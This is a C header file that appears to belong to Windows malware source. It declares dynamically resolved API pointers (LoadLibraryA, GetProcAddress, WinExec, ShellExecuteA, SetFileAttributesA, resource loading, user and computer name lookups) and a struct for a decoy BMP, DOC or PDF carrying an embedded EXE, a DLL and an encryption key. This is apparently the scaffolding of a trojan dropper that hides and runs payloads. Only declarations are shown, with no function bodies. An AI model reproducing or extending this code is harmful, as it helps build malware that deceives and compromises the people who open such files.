
#include <windows.h>
#include <lm.h>
#include "winternl.h"  

#pragma pack(1)

typedef HINSTANCE (__stdcall *ptrShellExecuteA)( HWND hwnd,  LPCSTR lpOperation,  LPCSTR lpFile,  LPCSTR lpParameters,LPCSTR lpDirectory,INT nShowCmd);
typedef DWORD (__stdcall *ptrGetProcAddress)(HMODULE,LPSTR);
typedef HMODULE (__stdcall *ptrLoadLibraryA)(LPSTR);
typedef  BOOL (WINAPI *ptrGetUserNameA) (LPSTR lpBuffer,LPDWORD pcbBuffer);
typedef BOOL (WINAPI *ptrGetComputerNameA) (LPSTR lpBuffer,LPDWORD nSize);
typedef UINT (WINAPI * ptrGetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
typedef VOID (WINAPI * ptrGetSystemTime)( LPSYSTEMTIME lpSystemTime);
typedef DWORD (WINAPI * ptrGetTickCount)(VOID);
typedef NET_API_STATUS (WINAPI * ptrNetWkstaGetInfo) (   LMSTR   servername ,IN  DWORD   level, LPBYTE  *bufptr);
typedef NET_API_STATUS (WINAPI * ptrNetApiBufferFree) ( LPVOID Buffer);
typedef HRSRC (WINAPI *ptrFindResourceA)( HMODULE hModule,LPCSTR lpName,LPCSTR lpType);
typedef DWORD (WINAPI *ptrSizeofResource)( HMODULE hModule, HRSRC hResInfo);
typedef HGLOBAL (WINAPI *ptrLoadResource)( HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI *ptrLockResource)( HGLOBAL hResData);
typedef HANDLE (WINAPI *ptrCreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL (WINAPI *ptrCloseHandle)( HANDLE hObject);
typedef BOOL (WINAPI *ptrReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *ptrWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef int (__stdcall *ptrlstrlenA)( __in LPCSTR lpString );
typedef int (__stdcall *ptrlstrcatA)( __in LPCSTR lpString1 ,LPCSTR lpString2);
typedef int (__stdcall *ptrlstrcpyA)( __in LPCSTR lpString1 ,LPCSTR lpString2);
typedef int (WINAPIV *ptrwsprintfA)(LPSTR,LPCSTR,...);
typedef BOOL (WINAPI *ptrMakeSureDirectoryPathExists)(char*);
typedef INT (WINAPI*ptrExitProcess)(int code);
typedef int (WINAPI* ptrWinExec)(char *,int );
typedef int (WINAPI* ptrSetFileAttributesA)(char *,int);

HMODULE lpDllShell32 = 0;
HMODULE lpDllKernel32 = 0;
HMODULE lpDllAdiapi32 = 0;
HMODULE lpDllNetApi32 = 0;
HMODULE lpDllUser32 = 0;
HMODULE lpDllDbghlp = 0;

ptrLoadLibraryA			lpLoadLibraryA = 0;
ptrShellExecuteA		lpShellExecuteA = 0;
ptrGetProcAddress		lpGetProcAddress = 0;
ptrGetUserNameA			lpGetUserNameA = 0;
ptrGetComputerNameA		lpGetComputerNameA = 0;
ptrGetSystemDirectoryA	lpGetSystemDirectoryA = 0;
ptrGetTickCount			lpGetTickCount = 0;
ptrNetWkstaGetInfo		lpNetWkstaGetInfo = 0;
ptrNetApiBufferFree		lpNetApiBufferFree = 0;
ptrGetSystemTime		lpGetSystemTime = 0;
ptrFindResourceA		lpFindResourceA = 0;
ptrSizeofResource		lpSizeofResource = 0;
ptrLoadResource			lpLoadResource = 0;
ptrLockResource			lpLockResource = 0;
ptrCreateFileA			lpCreateFileA = 0;
ptrCloseHandle			lpCloseHandle = 0;
ptrReadFile				lpReadFile = 0;
ptrWriteFile			lpWriteFile = 0;
ptrwsprintfA			lpwsprintfA = 0;
ptrMakeSureDirectoryPathExists	lpMakeSureDirectoryPathExists = 0;
ptrlstrlenA				lplstrlenA = 0;
ptrlstrcatA				lplstrcatA = 0;
ptrlstrcpyA				lplstrcpyA = 0;
ptrExitProcess			lpExitProcess = 0;
ptrWinExec				lpWinExec = 0;
ptrSetFileAttributesA	lpSetFileAttributesA;


#define CRYPT_KEY_SIZE			16
#define SYSTEM_VERSION_WIN9X	1
#define SYSTEM_VERSION_WIN2000	2
#define SYSTEM_VERSION_XP		3
#define SYSTEM_VERSION_VISTA	4
#define SYSTEM_VERSION_WIN7		5
#define SYSTEM_VERSION_WIN8		6
#define SYSTEM_VERSION_WIN10	7
#define SYSTEM_VERSION_UNKNOW	8

#define EMBEDDED_DATA_BMP 	0x1000
//#define SOURCE_DATA		0x2000
#define PROGRAM_ICON		0x3000


#pragma pack(1)
typedef struct{
	int openfiletype;
	int openfnlen;
	char openfilename[256];
	int openfilelen;
	int exefnlen;
	char exefilename[256];
	int exelen;
	int dllfnlen;
	char dllfilename[256];
	int dlllen;
	unsigned char key[16];
}BMPEMBEDDEDFILEINFO,*LPBMPEMBEDDEDFILEINFO;

#pragma pack()

//#define OPEN_FILE_TYPE_BMP
//#define OPEN_FILE_TYPE_DOC
//#define OPEN_FILE_TYPE_PDF